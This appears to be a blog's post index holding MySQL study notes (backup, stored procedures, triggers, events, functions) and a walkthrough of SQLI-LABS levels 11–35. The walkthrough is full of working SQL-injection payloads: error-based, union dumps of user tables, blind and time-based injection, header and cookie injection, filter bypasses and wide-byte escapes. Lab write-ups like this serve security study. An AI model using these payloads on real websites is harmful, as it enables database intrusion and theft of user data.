后记总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://chaosec.top/tags/SQL注入/"}]},{"title":"MySQL学习笔记(七)","slug":"mysql7","date":"2018-02-18T04:20:10.000Z","updated":"2019-01-30T11:56:08.265Z","comments":true,"path":"2018/02/18/mysql7/","link":"","permalink":"http://chaosec.top/2018/02/18/mysql7/","excerpt":"本节介绍MySQL数据库的备份和恢复。","text":"本节介绍MySQL数据库的备份和恢复。 常用的备份恢复方法本节介绍多种备份方法 使用SQL语句：导入导出数据1、导出表数据SELECT INTO…OUTFILE格式：12345678SELECT * INTO OUTFILE '文件名1'[FIELDS [TERMINATED(终止) BY 'string'] [[OPTIONALLY] ENCLOSED by 'char'] [ESCAPED BY 'char']][LINES TERMINATED BY 'string']|DUMPFILE '文件名2' 说明： (1)这个语句将select语句选中的行写入到一个文件中，如果要指定特定位置，则要在文件名前加上具体的路径，空值会以’\\N’表示(2)FIELDS子句：如果指定了FIELDS子句，那么后面的三个至少要指定一个。1、TERMINATED BY 用来指定字段值之间的的符号，例如，TERMINATED BY ‘,’，则指定了逗号作为分隔标志，2、ENCOLSED BY 子句用来指定包裹文件中字符值的符号，例如ENCLOSED BY ‘“‘，表示文件中字符值放在双引号之间，若加上OPTIONALLY表示所有的值都放在双引号之间。3、ESCAPED BY 子句用来指定转义字符，例如，“ESCAPED BY ‘*‘” 将“*”指定为转义字符，取代“\\”，如空格将表示为“*N”。(3)LINES子句：在LINES子句中使用TERMINATED BY 指定一行结束的标志，比如“LINES TERMINATED BY ‘?’”表示一行以“?”作为结束标志。如果FIELDS和LINES子句都不指定，则默认使用以下子句。12FIELDS TERMINATED BY '\\t' ENCLOSED BY '' ESCAPED BY '\\\\'LINES TERMINATED BY '\\n' 如果使用DUMPFILE而不是使用OUTFILE，所导出文件中的所有行都彼此紧挨着放置，值和行之间没有任何标记，，形成了一个长长的值。 注意：使用上述语句导出的只是数据的内容，不包括表的结构。 2、导入表数据该语句可以将OUTFILE语句导入文件中的数据导入到数据库中。LOAD DATA …INFILE格式： 123456789101112131415LOAD DATA [LOW_PRIORITY|CONCURRENT] [LOCAL] INFILE '文件名.txt' [REPLACE|IGNORE] INTO TABLE 表名 [FIELDS [TERMINATED(终止) BY 'string'] [[OPTIONALLY] ENCLOSED by 'char'] [ESCAPED BY 'char'] ] [LINES [STARTING BY 'string'] [TERMINATED BY 'string'] ] [IGNORE number LINES] [(列名或用户变量, ...)] [SET 列名=表达式, ...] 说明： LOW_PRIORITY|CONCURRENT：若指定前者，则延迟语句的执行，若指定后者，则当LOAD DATA正在执行的时候，其他线程可以同时使用该表的数据。LOCAL：若指定LOCAL，则文件会被客户主机上的客户端读取，并被发送到服务器，只是执行速度略慢些。文件名.txt：可以带路径指定文件名。REPLACE|IGNORE：如果指定了REPLACE，则当文件中出现与原有行相同的唯一关键字值时，输入行会替换原有行，如果是IGNORE的话会跳过。STARTING指定每行的前缀，如果行中不包括该前缀，则该行被跳过。IGNORE number LINES：可以用来忽略文件的前几行，例如，可以使用IGNORE 1 LINES来跳过第一行。列名或用户变量：当表中列的顺序与文件中字段值顺序不同时，就必须指定一个列清单。SET子句：SET子句可以在导入数据时修改表中列的值。 example: 12345select * from student where job='计算机科学与技术' into outfile 'D:/myfile.txt' fields terminated by ',' optionally enclosed by '\"' lines terminated by '?'; 执行此语句产生报错： ERROR 1290 (HY000): The MySQL server is running with the —secure-file-priv option so it cannot execute this statement 这是因为MySQL对默认导出的目录有权限限制，使用命令show variables like ‘%secure_file%’ 可以查看此目录，必须导入到指定目录中才可以。 secure_file_priv: G:\\PHPwamp\\wamp64\\tmp\\ 修改后的语句： 12345select * from student where job='计算机科学与技术' into outfile 'G:/PHPwamp/wamp64/tmp/myfile.txt' fields terminated by ',' optionally enclosed by '\"' lines terminated by '?'; 注意：这里的Windows路径名称需要使用正斜杠指定而不是反斜杠。 导入上述数据到新建的xs表中： 12345load data infile 'G:/PHPwamp/wamp64/tmp/myfile.txt' into table xs fields terminated by ',' optionally enclosed by '\"' lines terminated by '?';","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(六)","slug":"mysql6","date":"2018-02-09T02:51:13.000Z","updated":"2018-02-16T12:43:16.219Z","comments":true,"path":"2018/02/09/mysql6/","link":"","permalink":"http://chaosec.top/2018/02/09/mysql6/","excerpt":"前言MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。","text":"前言MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。 存储过程使用存储过程的优点 (1) 存储过程在服务器端运行，执行速度快(2) 存储过程执行一次后，期执行计划就会存储在告诉缓冲存储器中，在以后的操作中则会直接调用已编译的二进制代码执行，从而提高了系统性能。(3) 确保数据库安全，使用存储过程即可完成所有数据库操作，可以通过编程方式控制上述操作对数据库信息访问的权限。存储过程实质上相当于函数，所以具有函数的优点。 创建存储过程创建存储过程命令格式 12create procedure 存储过程名 ( [参数 ...] ) [ 特征 ...] 主体 1、存储过程参数参数:1[ in|out|inout ] 参数名 参数类型 # 输入参数|输出参数|输入/输出参数，相当于input，print等 注意：参数的名字不要采用列的名字，否则会引发重名错误。 2、存储过程特征12345 language SQL| [not] deterministic| &#123;contains sql|no sql|reads sql data|modifies sql data&#125;| sql security &#123;definer|invoker&#125;| comment 'string' 说明： language SQL：表名编写这个的语言为SQL语言，指定编程语言，目前仅支持SQL语言。故此选项不可指定deterministic：对同样的输入参数输出相同的结果，加 not 参数会产生不确定的结果，默认为 not deterministiccontains sql：表示存储过程不包含读或写数据的语句， reads sql data 表示存储过程包含读数据的语句，但不包含写的数据。 modifies sql data 表示存储过程包含写数据的语句。默认的是 contains sql。sql security：定义使用该存储过程的用户的许可。 definer创建者， invoker调用者。comment ‘string’：对存储过程的描述， string为描述内容。可以使用命令 show create procedure 来显示。 3、存储过程主体存储过程主体包含了在过程调用的时候必须执行的语句，这个部分总是以begin开始，以end结束，如果包含多个语句，则以分号作为结束符，当然，如果只有一句语句的话则不必指定begin-end语句。 服务器处理语句的时候是以分号作为结束符，如果以分号作为每个语句的结束符，那么执行一条语句就会遇到分号则会认为执行结束，这显然无法执行后面的指令，所以需要用”delimiter 结束符”将结束符改为其他符号。 用存储过程实现删除一个特定学生的信息 123456delimiter $$create procedure delete_student(in xh char(6))begin delete from xs where 学号=xh;end $$delimiter ; 存储过程体在存储过程中可以使用所有的SQL语句类型，也包括变量的定义和赋值。 1、局部变量在存储过程可以声明局部变量，可以用来存储临时结果，如果不赋初值的话则默认为NULL。 1declare 变量名 ...类型 [默认值] example 12declare num int(4);declare str1,str2 varchar(6); 局部变量只可以在begin-end语句块中声明，并且必须在存储过程的开头。声明完后也只能在该b-e块中使用，不能再其它块中使用。当然，也可以创建 用户变量 ，只要在前面加@符号，用户变量存在于整个回话之中。 2、使用set语句赋值格式：1set 变量名=表达式 [,变量名=表达式] ... example 1set num=1, str1='hello'; 3、select…into语句使用这个语句可以把选定的列值直接存储到变量中。因此，返回结果只能有一行。 1select 列名[,...] into 变量名 [,...] table_expr table_expr指select语句中的from子句及后面的部分。 example 例如，在存储过程中，将xs表中的学号为081101的学生姓名和专业名的值分别赋给变量name和project。 123select 姓名,专业名 into name,project from xs; where 学号='081101'; 注意：该语句只能在存储过程中使用，而且变量名name和project需要在使用之前声明。 4、流程控制语句在MySQL语句中，可以使用过程式语句。 1) if语句格式： 1234if 条件 then 语句[elseif 条件 then 语句] ...[else 语句]end if example 对于一个数据库，判断两个输入的参数哪一个更大。 12345678910111213delimiter $$create procedure xscj.compar (in kl interger,in k2 interger,out k3 char(6))begin if k1&gt;k2 then set k3='大于'; elseif k1=k2 then set k3='等于'; else set k3='小于'; end if;end$$delimiter ; 2) case语句格式： 12345CASE case_value WHEN when_value THEN 语句 [WHEN when_value THEN 语句] ... [ELSE 语句]END CASE 或者12345CASE WHEN 条件 THEN 语句 [WHEN 条件 THEN 语句] ... [ELSE 语句]END CASE example 1234567891011delimiter $$create procedure xscj.result (in str varchar(4),out sex varchar(4))begin case str when 'm' then set sex='男'; when 'f' then set sex='女'; else set sex='无'; end case;end $$delimiter ; 或者 12345case when str='m' then set sex='男'; when str='f' then set sex='女'; else set sex='无';end case; 3) 循环语句while语句格式1234[begin_label:]WHILE 条件 DO 语句END WHILE [end_label] 注意：b-e label必须同时出现，并且label必须相同。 123456789delimiter $$create procedure dowhile()begin declare v1 int default 5; while v1&gt;0 do set v1=v1-1; end while;end$$delimiter ; repeat语句格式12345[begin_label:]REPEAT 语句 UNTIL 条件END REPEAT [end_label] example1234repeat v1=v1-1; until v1&lt;1;end repeat; LOOP语句格式1234[begin_label:]LOOP 语句END LOOP [end_label] loop 允许某特定语句或语句群的重复执行，想要退出的话可以用一个leave语句。 1LEAVE label example 123456789101112delimiter $$create procedure doloop()begin set @a=10; label:loop set @a=@a-1; if @a&lt;0 then leave label; end if; end loop label;end$$delimiter ; iterate语句1ITERATE label 这个语句意为”再次循环”，指重新开始一个循环，与continue的含义类似。 5、处理程序和条件6、游标一条select…into语句返回的是带有值的一行，如果想要处理返回的多行数据，则可以使用游标。 1)声明游标语法格式：1DECLARE 游标名 CURSOR FOR select 语句 注意：select语句不能有into子句 example 1234declare xs_curl cursor for select 学号,姓名,性别,出生日期,总学分 from xs where 专业名='计算机'; 注意：该语句不能单独运行，必须在存储过程或存储函数中运行。 2)打开游标1OPEN 游标名 3)读取数据1FETCH 游标名 INTO 变量名 ... fetch语句是将一行数据赋给一些变量，每次已自动读取到下一行，所以变量名数量必须与select语句中的列数相等。 4)关闭游标1CLOSE 游标名 example 1close xs_cur2 下面是一些示例： example 12345678910111213141516171819delimiter $$create procedure compute (out number integer)begin declare xh char(6); declare found boolean default true; declare number_xs cursor for select 学号 from xs; declare continue handler for not found set found=false; set number=0; open number_xs; fetch number_xs into xh; while found do set number=number+1; fetch number_xs into xh; end while; close number_xs;end $$delimiter ; 在MySQL 5.6以后，创建存储过程必须具有CREATE ROUTINE权限。想要查看数据库中哪些存储过程，可以使用 show procedure status命令，要查看具体过程，可以使用 show create procedure 存储过程名命令。 存储过程的调用、删除和修改1、存储过程的调用存储过程创建完毕后，可以在程序、触发器或者其他存储过程中被调用，一般使用 call语句来调用。 语法格式：1CALL 存储过程名 ([参数 ...]) 如果要调用某个数据库的存储过程，那么必须先使用这个数据库。 2、存储过程的删除格式1DROP PROCEDURE [IF EXISTS] 存储过程名 3、存储过程的修改使用alter procedure 可以修改存储过程的部分特征。格式1ALTER PROCEDURE 存储过程名 [特征...] 特征123&#123;contains sql|no sql|reads sql data|modifies sql data&#125;|sql security &#123;definer|invoker&#125;|comment 'string' 如果想要修改存储过程的内容，可以采用先删除再重新定义存储过程的方法。 存储函数存储函数和存储过程类似，也是由过程式语句组成的代码片段，但是，也有一些区别： (1)存储函数不能拥有输出参数，因为存储函数本来就是输出参数(2)不能用CALL语句来调用存储函数(3)存储函数必须包含一条RETURN语句，而存储过程中则不得包含。 创建存储函数查看数据库中有哪些存储函数，可以使用命令：1show function status 创建存储函数CREATE FUNCTION语法格式123CREATE FUNCTION 存储过程名 ([参数...]) RETURNS type [特征...] 主体 说明 存储函数的定义和存储过程相似。 存储函数不能与存储过程同名存储函数的参数只有名称和类型，不能指定IN,OUT,INOUT。RETURNS type声明函数返回值的数据类型。主体也叫存储函数体，与存储过程中使用的一样，但是存储函数体必须包含一个 RETURN value,value为存储函数的返回值。 example该例子返回xs表中学生的数目作为结果 1234567delimiter $$create function num_of_xs()returns integerbegin return (select count(*) from xs);end$$delimiter ; 存储函数的调用、删除和修改1、存储函数的调用存储函数和MySQL的内置函数(比如version())，所以调用存储函数可以使用 select 关键字。 语法格式： 1SELECT 存储函数名 ([参数[,...]]) 存储函数内部也可以调用另外一个存储函数或存储过程 2、删除存储函数语法格式：1DROP FUNCTION [IF EXISTS] 存储过程名 example 1drop function if exists num_of_xs; 3、存储函数的修改1ALTER FUNCTION 存储过程名 [特征 ...] 触发器触发器不需要被调用，是一个被指定关联到一个表的数据对象，当对一个表的特别事件出现时触发器就会被自动调用。可是实现比如多个表信息的一致性，可通过定义 delete 触发器来实现上述功能。 创建触发器想要查看有哪些触发器使用SHOW TRIGGERS 命令。 CREATE TRIGGER语法格式 12CREATE TRIGGER 触发器名 触发时刻 触发事件 ON 表名 FOR EACH ROW 触发器动作 说明 触发器名称必须唯一，若要在某个特定数据库中创建，名称前要加上数据库名触发器时刻，有两个选项：after和before，如果想要在激活之后执行一些语句则可以使用after，如果想要进行验证即可以使用before选项。触发器事件：指明了激活触发程序语句的类型。可以是下述值之一INSERT 将新行插入表时激活触发器，例如通过INSERT、LOAD DATA和REPLACE语句。UPDATE 更改某一行时激活触发器。例如UPDATE语句。DELETE 从表中删除某一行时激活触发器。例如，通过DELETE和REPLACE语句。表名：表示在该表上激活触发程序才会激活触发器，同一个表不能拥有两个具有触发时刻和时间的表，触发时间指before和after。FOR EACH ROW：这个声明用来指定对于受触发器事件影响的每一行都要激活触发器的动作。包含触发器激活时将要执行的语句，可使用 begin-end 结构来执行多条语句。 注意：触发器不能返回任何数据到客户端，同样也不能调用将数据返回客户端的存储过程。 example 创建一个表，表中只有一列a，在表上创建一个触发器，每次插入操作时，将用户变量str的值设为“trigger is working”。1234create table table1(a integer);create trigger table1_insert after insert on table1 for each row set @str='trigger is working'; 向table1中插入一行数据1insert into table1 values(10); 查看str的值即可查看触发器是否触发。 MySQL可以关联表中的列，亦可以调用存储过程。在关联表中的列时需要注意： MySQL可以关联表中的任意列，但不能直接使用列的名称作为标志，那会使系统混淆。必须这样描述才可以：NEW.column_name 或者 OLD.column_name 。 NEW.column_name用来引用新行的一列，OLD.column_name 用来引用更新或删除它之前的已有行的一列。对于INSERT语句来说，只有new是合法的，对于DELETE语句，只有OLD才合法，而UPDATE语句可以与OLD和NEW同时使用。 example 创建一个表实现关联删除的功能 1234567delimiter $$create trigger xs_delete after delete on xs for each rowbegin delete from xs_kc where 学号=old.学号；end$$delimiter ; 在触发器中也可以调用存储过程。 删除触发器1DROP TRIGGER [schema_name.]trigger_name schema_name为所在数据库的名称 事件自MySQL5.6之后已经开始支持事件，可能各版本的功能会有所不同，这里是简单的MySQL5.6的版本。事件是MySQL在相应的时刻调用的过程式数据库对象。 事件的主要作用如下： 关闭账户打开或关闭数据库指示器使数据库中的数据在某个间隔后刷新执行对进入数据的复杂的检查工作。 创建事件语法格式：123456CREATE EVENT [IF NOT EXISTS] 事件名 ON SCHEDULE schedule [ON COMPLETION [NOT] PRESERVE] [ENABLE|DISABLE|DISABLE ON SLAVE] [COMMENT 'comment'] DO sql语句； schedule：123456AT timestamp [+INTERVAL interval]|EVERT interval[STARTS timestamp [+INTERVAL interval]][ENDS timestamp [+INTERVAL interval]]interval:count &#123;YEAR|QUARTER|MONTH|DAY|HOUR|MINUTE|WEEK|SECOND|YEAR_MONTH|DAY_HOUR|DAY_MINUTE|DAY_SECOND|HOUR_MINUTE|HOUR_SECOND|MINUTE_SECOND&#125; 说明： schema：时间调度，表示事件何时发生或每隔多久发生一次。AT子句：表示在某个时刻事件发生。timestamp表示一个具体的时间点，后面可以加上一个时间间隔，interval表示这个时间间隔，有一个数字和单位组成，count是间隔时间的数值。EVERY子句：表示在指定时间间隔内每隔多长时间事件发生一次，STARTS子句设定开始时间，ENDS子句设定结束时间。sql语句：时间执行代码，可以使用begin-end结构时间属性：每个事件都可以定义几个属性。ON COMPLETION NOT PRESERVE表示事件最后执行完之后自动删除该事件，不加NOT表示不删除。默认为有not参数 MySQL事件有事件调度器负责调用，打开事件调度器命令为1SET GLOBAL EVENT_SCHEDULER=TRUE; example创建一个30秒后启动的事件 1234use xscjcreate event afterseconds on schedule at now()+interval 30 second do insert into xs values('091103','张建'); 修改和删除事件修改事件12345ALTER EVENT event_name [ON SCHEDULE schedule] [ON COMPLETION [NOT] PRESERVE] [RENAME TO new_event_name] [ENABLE|DISABLE|DISABLE ON SLAVE] 删除事件1DROP EVENT [IF EXISTS] [database name.] event name","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"SQLI-LABS(Less11-Less35)","slug":"sqli-labs2","date":"2018-02-09T02:50:57.000Z","updated":"2019-05-16T09:18:03.185Z","comments":true,"path":"2018/02/09/sqli-labs2/","link":"","permalink":"http://chaosec.top/2018/02/09/sqli-labs2/","excerpt":"接上篇","text":"接上篇 LESS-11有回显，尝试报错注入12usernae = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))#password = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))# 发现有回显 XPATH syntax error: ‘:security’ 则可以得到数据库名。 常用报错语句 1、通过floor报错,注入语句如下:1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下:1and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下:1and 1=(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下:1and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下:1select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下:1and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下:1and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下:1and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下:1and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下:1and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下:1and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下:1and linestring (()select * from(select user() )a)b ); 还有其他方法 1uname=1admin' union select 1,database()#&amp;passwd=1 这样可以得到数据库名继续爆表 1uname=admin45' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#&amp;passwd=1 可以得到 Your Password:emails,referers,uagents,users爆字段 1uname=admin45' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#&amp;passwd=1 Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password爆内容 1uname=admin45' union select 1,concat_ws(password) from users#&amp;passwd=1 LESS-12构造闭合语句1uname=admin\") or 1=1 limit 0,1#&amp;passwd=1 后面和11关一样 LESS-13尝试 uname=admin&#39;&amp;passwd=1,返回错误信息 near ‘1’) LIMIT 0,1’ at line 1 构造闭合语句1uname=admin')#&amp;passwd=1 可以成功登陆，但是无法和前面一样显示信息，故得使用盲注1uname=admin') and left(database(),1)='s'#&amp;passwd=1 然后一步步可以得到所有信息 LESS-14直接换双引号闭合1uname=admin\" or 1=1#&amp;passwd=1 LESS-15单引号闭合即可1uname=admin\" or 1=1#&amp;passwd=1 也可以延时注入1uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))#&amp;passwd=admin LESS-16payload1uname=admin\") or 1=1#&amp;passwd=1 LESS-17本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。报错注入payload1uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit 也可以延时注入，但是延时注入会修改数据库内容，不建议使用。 接下来三关是对header头的注入 LESS-18截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。修改User-Agent，利用报错进行注入payload1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1 这个在本题不可以用，但是可以报错，1extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) LESS-19只是将注入位置换为referer即可 LESS-20用cookie注入,这里我用的是火狐的Cookie Manager插件1Dumb' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# 然后可以继续注入获取全部内容。 LESS-21本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。1Dumb') and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# 再用base64编码1RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d LESS-22与21关相同只是闭合方式变成了双引号1RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d LESS-23此题过滤了—和#注释符，构造payload闭合 ?id=1&#39; and &#39;a&#39;=&#39;a，继续获取文件路径1?id=-1&apos; union select 1,@@datadir,&apos;a 获取表名1?id=-1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;a 下面的不再演示，还可以报错注入，延时注入等1?id=-1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &apos;a&apos;=&apos;a 延时注入1?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5)) and &apos;a&apos;=&apos;a LESS-24本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。先创建一个用户admin&#39;#，如果修改密码，则会将admin用户的密码修改。SQL语句就变为1update users set paddwd='new_pass' where username='admin'#' and password=' 相当于执行了update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;，从而更改了用户名。 LESS-25单引号闭合联合注入1?id=-1' union select 1,database(),'a 本题要绕过and和or，有常用的几个方法 (1)大小写变形，如Or,oR,OR(2)编码，hex,urlencode(3)添加注释/*or*/(4)利用符号 and=&amp;&amp; ,or=||(5)重复输入anandd 利用方法41?id=1' || updatexml(1,concat(0x7e,(select @@version),0x7e),1) || '1'='1 LESS-25a本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入1?id=-1 union select 1,database(),3# LESS-26由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。1?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1 然后继续注入1?id=1&apos;||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||&apos;1&apos;=&apos;1 对于空格常用的方法为： 编码 含义 %09 TAB键(水平) %0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键(垂直) %a0 空格 LESS-26a本关无法回显错误，无法使用报错注入，还有闭合方式为 ?id=1&#39;)盲注payload：1?id=1&apos;anandd(select(substr((select(database())),1,1)))=&apos;s 联合注入1?id=555&apos;)union(select(1),(user()),&apos;1 爆用户名1?id=555&apos;)union(select(1),group_concat(username),(2)from(users)where(1=1))union(select(1),(2),&apos;a LESS-27本题过滤了select和上关的字符，可以大小写混合绕过报错注入payload1?id=0&apos;||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())))||&apos;1&apos;=&apos;1 LESS-27a本题双引号闭合，无法报错。盲注payload：1?id=0&quot;||(SelEct(substr((SelecT(database())),1,1)))=&quot;s LESS-28与前面没有太大区别，盲注payload1?id=888&apos;)||(SelecT(substr((SelEct(database())),1,1)))=(&apos;s 联合注入1?id=888&apos;)unIon(Select(1),database(),&apos;a LESS-28a本题知识简单过滤了union等符号，联合注入1?id=555&apos;)unIon(SeLect 1,database(),&apos;3 LESS-29注意：本题的index.php页面没有任何防护，注册页面是在login.php页面 在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可1?id=1&amp;id=-1&apos; union select 1,group_concat(username),2 from users--+ 本关为HPP(http参数污染)攻击,具体参见百度 LESS-30与29关相同，只是闭合方式改为&quot;1?id=1&amp;id=-1&quot; union select 1,group_concat(username),2 from users--+ LESS-31与前面的相同，只是闭合方式变了1?id=1&amp;id=-2&quot;) union select 1,database(),3--+ 宽字节注入原理： mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤&#39;的时候，往往利用的思路是将\\&#39;，因此我们的思路就是将’前面的\\换掉。 方法一般有两种： 1、%df吃掉\\\\，具体的原因是urlencode(\\\\’)=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。2、将%\\*\\*%5c%5c%27的情况，后面%5c会被前面的%5c给注释掉 LESS-32用第一种方法绕过1?id=-1%df%27union%20select%201,user(),3--+ 这个payload执行的sql语句是1select 1,2,3 from users where id=&apos;-1運&apos;union select 1,user(),3; LESS-33这个和上一题没什么区别，同样的payload也可以用1?id=-1%df%27union select 1,2,@@basedir--+ LESS-34本关是post型的注入漏洞，同样也是进行了♦&#39;，我们利用这个方式尝试。payload1uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit 继续的话可以1uname=♦&apos; union select 2,@@basedir#&amp;passwd=1&amp;submit=Submit LESS-35本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了1?id=-1 union select 1,database(),3# 在后面的时候有个数字型注入，编码绕过即可1?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://chaosec.top/tags/SQL注入/"}]},{"title":"MySQL学习笔记(五)","slug":"mysql5","date":"2018-02-07T03:03:49.000Z","updated":"2018-02-25T08:40:45.961Z","comments":true,"path":"2018/02/07/mysql5/","link":"","permalink":"http://chaosec.top/2018/02/07/mysql5/","excerpt":"MySQL语言结构","text":"MySQL语言结构 MySQL语言简介在MySQL数据库中，SQL语言有以下四部分组成 (1)数据定义语言(Data Definition Language,DDL)，用于执行的对数据库的操作，例如 create、 alter等。(2)数据操纵语言(Data Manipulation Language,DML),用于操纵数据库，比如 select、 insert等。(3)数据控制语言(Data Control Language),比如授予和收回权限 grant 和 revoke(4)MySQL增加的语言元素，比如变量常量等。 部分常量值十六进制常量十六进制常量通常被当做字符串来存储，在字符串前面加一个x或者X，注意数字不能超出16进制的范围，如果在前面几加0x的话就不需要加引号了，十六进制默认作为字符串来处理，如果想作为数字处理的话，使用 CAST(… AS UNSIGNED) 语句，比如 select 0x41,cast(0x41 as unsigned);, HEX()函数可将字符串转换为十六进制。 位字段值一般使用b’value’来表示二进制值。 BIN()可以把位字段常量转为二进制显示， OCT()转为数字显示。 变量用户变量语法格式 1set @user_variables1=expression1[,user_variables2=expression2...] 系统变量分为全局变量(GLOBAL)和局部变量(LOCAL &#124; SESSION) 常用函数1、数学函数(数学函数支持嵌套使用)1、great() 和 least()函数： 获取一组数中的最大值和最小值1great(1,2,3)--&gt;3 least(1,2,3)--&gt;1 注意：MySQL中函数名与括号之间不能有空格 2、 floor() 和 ceiling() 函数 floor() 函数用于获得小于一个整数的最大整数值，ceiling 用于获得大于一个整数的最小整数值。 3、 round() 和 truncate() round() 用于获得一个数的四舍五入的整数值。 truncate(a,b) 用于把一个数字a截取为一个指定小数位数b的数字 1truncate(1.54578,2)--&gt;1.54 4、 abs() 函数 获取绝对值 5、 sign() 函数 返回数字的符号，返回的结果是正数(1)，负数(-1)、或者零(0) 6、 sqrt() 函数 返回平方根 7、 pow() 函数 pow(a,b)—&gt; a^b 8、 bin() 、 otc() 、 hex() 函数 分别返回一个数的二进制、八进制和十六进制值，作为字符串返回 2、聚合函数比如 count(), sum() 等 3、字符串函数1、 ascii(char) 函数 返回字符表达式最左端字符的ASCII值，返回值为整型 2、 char() 函数1char(x1,x2,x3,...) 将x1,x2,x3的ascii码转换为字符，组成一个字符串。 3、 left() 和 right 函数left&#124;right (str,x) 返回字符串str左边或右边的前x个字符 4、 trim 和 ltrim 和 rtrim 函数1trim|ltrim|rtrim(str) ltrim 和 rtrim 分别删除字符串左边和右边的空格，trim 则删除左右两边的空格。 5、 rpad() 和 lpad 函数1rpad|lpad(str,n,pad) 用字符串pad对字符串str左边后右边进行填充，直到str的字符数目得到n个，若str的字符个数大于n，则返回前n个字符 6、 replace(str1,str2,str3) 函数 用字符串str3替换str1中所有出现的字符串str2。 7、 concat(s1,s2,s3,…) 字符串连接函数 8、 substring(expr,start,length) 返回指定长度的子串 9、 strcmp(s1,s2) 字符串比较函数 4、 类型转换函数1cast(expr,AS type) expr是要转化的值，type是转换后的数据类型，类型有binary , char , date , date , time , datetime , signed , unsigned 。 5、 控制流函数1、 ifnull() 和 nullif() 函数1ifnull(expr1,expr2) 判断参数expr1是否为null，如果expr1为null，则返回expr2，否则返回expr1。 1nullif(expr1,expr2) 判断两个参数是否相等，如果相等返回null，否则返回第一个参数。 2、 if() 函数1if(expr1,expr2,expr3) 